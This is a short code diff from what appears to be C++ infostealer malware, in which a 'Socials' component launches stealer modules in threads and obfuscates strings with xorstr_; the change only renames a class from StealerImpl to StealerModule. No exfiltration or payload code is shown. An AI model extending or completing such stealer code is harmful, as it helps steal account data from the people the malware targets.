@@ -17,7 +17,7 @@ void Socials::execute(fs::path &root) {
     fs::path socials_path = root / xorstr_("Socials");
     std::vector<std::thread> threads;
 
-    for(StealerImpl* module : this->modules) {
+    for(StealerModule* module : this->modules) {
         threads.emplace_back([module, &socials_path]() {
             module->execute(socials_path);
         });
